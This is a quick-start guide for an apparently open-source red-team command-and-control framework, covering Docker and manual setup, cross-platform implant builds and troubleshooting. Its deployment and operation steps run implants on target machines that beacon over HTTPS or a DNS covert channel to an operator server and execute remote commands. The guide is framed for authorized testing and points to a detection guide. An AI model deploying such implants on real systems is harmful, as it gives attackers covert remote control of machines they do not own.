# Red Team C2 Framework - Quick Start Guide

## Prerequisites Check

Before starting, ensure you have:

- [x] **Docker** (20.10+) and **Docker Compose** (v2.0+)
- [x] **OR** Manual setup:
  - Go 1.21+
  - Rust 1.75+
  - Python 3.11+
  - PostgreSQL 15+

## Option 1: Docker Deployment (Recommended)

### Step 1: Clone Repository

```bash
git clone https://github.com/Raoof128/CRTIAE.git
cd CRTIAE
```

### Step 2: Start Infrastructure

```bash
# Start all services
docker-compose up -d

# Verify services are running
docker-compose ps
```

Expected output:
```
NAME            IMAGE              STATUS          PORTS
c2_controller   c2-controller      Up
c2_database     postgres:15-alpine Up (healthy)    0.0.0.0:5432->5432/tcp
c2_teamserver   c2-teamserver      Up              0.0.0.0:8443->8443/tcp
```

### Step 3: Check Logs

```bash
# Teamserver logs
docker-compose logs -f teamserver

# Database logs
docker-compose logs database

# All logs
docker-compose logs -f
```

### Step 4: Use Operator CLI

```bash
# Access controller container
docker-compose exec controller bash

# Run operator commands
python main.py beacons
python main.py --help
```

### Step 5: Deploy Implant (Testing)

**On target system** (authorized testing only):

```bash
# Download implant binary (from build or cross-compile)
./implant --server https://YOUR_SERVER_IP:8443 \
          --interval 60 \
          --jitter 50 \
          --insecure  # Only for testing with self-signed certs
```

### Step 6: Monitor Beacon

```bash
# List beacons
docker-compose exec controller python main.py beacons

# Execute command
docker-compose exec controller python main.py exec BEACON_ID "whoami"

# View output
docker-compose exec controller python main.py output BEACON_ID
```

### Cleanup

```bash
# Stop all services
docker-compose down

# Remove volumes (database data)
docker-compose down -v
```

---

## Option 2: Manual Build & Deployment

### Step 1: Set Up Database

```bash
# Install PostgreSQL
sudo apt install postgresql postgresql-contrib  # Debian/Ubuntu
# or
brew install postgresql  # macOS

# Start PostgreSQL
sudo systemctl start postgresql  # Linux
# or
brew services start postgresql  # macOS

# Create database and user
sudo -u postgres psql
```

```sql
CREATE USER c2user WITH PASSWORD 'c2password';
CREATE DATABASE c2_database OWNER c2user;
GRANT ALL PRIVILEGES ON DATABASE c2_database TO c2user;
\q
```

### Step 2: Build Teamserver (Rust)

```bash
cd teamserver

# Install Rust (if not already installed)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Build teamserver
cargo build --release

# Set environment variables
export DATABASE_URL="postgres://c2user:c2password@localhost:5432/c2_database"
export SERVER_ADDR="0.0.0.0:8443"
export RUST_LOG=debug

# Run teamserver
./target/release/teamserver
```

### Step 3: Build Implant (Go)

**In a new terminal:**

```bash
cd implant

# Download dependencies
go mod download

# Build for Linux
go build -o implant main.go

# Build for Windows (cross-compile)
GOOS=windows GOARCH=amd64 go build -o implant.exe main.go

# Build for macOS
GOOS=darwin GOARCH=amd64 go build -o implant-macos main.go
```

### Step 4: Set Up Python Controller

**In a new terminal:**

```bash
cd controller

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# or
venv\Scripts\activate  # Windows

# Install dependencies
pip install -r requirements.txt

# Run CLI
python main.py --server http://localhost:8443 beacons
```

### Step 5: Deploy Implant

```bash
# On target system (authorized testing only)
cd implant

# Run with HTTPS beaconing
./implant --server https://YOUR_SERVER_IP:8443 \
          --interval 120 \
          --jitter 50

# Or with DNS covert channel
./implant --dns \
          --dns-domain c2.example.com \
          --interval 180
```

### Step 6: Operate

```bash
# List beacons
python controller/main.py beacons

# Execute command
python controller/main.py exec <BEACON_ID> "ls -la"

# View output
python controller/main.py output <BEACON_ID>

# Interactive mode
python controller/main.py interactive
```

---

## Quick Build All Platforms

Use the automated build script:

```bash
# Build implant for all platforms
./build_implant.sh

# Output directory: build/
# Files:
# - implant-linux-amd64
# - implant-linux-arm64
# - implant-windows-amd64.exe
# - implant-darwin-amd64
# - implant-darwin-arm64
# - checksums.txt
```

---

## Common Issues & Troubleshooting

### Issue: Database Connection Failed

**Symptom**: Teamserver logs show "connection refused"

**Solution**:
```bash
# Check PostgreSQL is running
docker-compose ps database
# or
sudo systemctl status postgresql

# Verify connection
psql -h localhost -U c2user -d c2_database

# Check DATABASE_URL environment variable
echo $DATABASE_URL
```

### Issue: Go Build Fails

**Symptom**: `go build` shows errors

**Solution**:
```bash
# Clean and retry
cd implant
go clean
go mod tidy
go build -v .
```

### Issue: Rust Build Fails

**Symptom**: `cargo build` fails with SQLx errors

**Solution**:
```bash
# Skip SQLx compile-time checks (use runtime only)
cd teamserver
cargo clean
cargo build --release
```

### Issue: Implant Can't Connect to Teamserver

**Symptom**: No beacons appear

**Solution**:
```bash
# Check teamserver is listening
netstat -tlnp | grep 8443
# or
lsof -i :8443

# Check firewall
sudo ufw status
sudo ufw allow 8443/tcp

# Test with curl
curl -k https://localhost:8443/health

# Check implant logs
./implant --server https://localhost:8443 --insecure
```

### Issue: Docker Compose Fails

**Symptom**: Services won't start

**Solution**:
```bash
# Check Docker daemon
sudo systemctl status docker

# Rebuild containers
docker-compose down
docker-compose build --no-cache
docker-compose up -d

# Check logs
docker-compose logs
```

---

## Security Reminders

### Before Testing

1. **Get Authorization**: Written permission from system owner
2. **Define Scope**: Document authorized targets
3. **Notify Stakeholders**: IT security team, SOC, etc.
4. **Backup Data**: Before any testing

### During Testing

1. **Stay in Scope**: Only interact with authorized systems
2. **Document Actions**: Log all commands executed
3. **Avoid Disruption**: Test during maintenance windows
4. **Monitor Impact**: Watch for unintended effects

### After Testing

1. **Remove Implants**: Delete all binaries from targets
2. **Clean Artifacts**: Remove logs, temporary files
3. **Report Findings**: Provide comprehensive writeup
4. **Destroy Data**: Securely delete any collected credentials

---

## Next Steps

- Read `README.md` for full documentation
- Review `SECURITY_POLICY.md` for responsible use
- Check `blue-team-guide/` for detection methods
- See `IMPLEMENTATION_SUMMARY.md` for architecture details

---

## Support

- **GitHub Issues**: https://github.com/Raoof128/CRTIAE/issues
- **Documentation**: See `/docs` directory
- **Security**: See `SECURITY_POLICY.md`

---

**Remember: This framework is for authorized security testing only. Always act ethically and legally.**
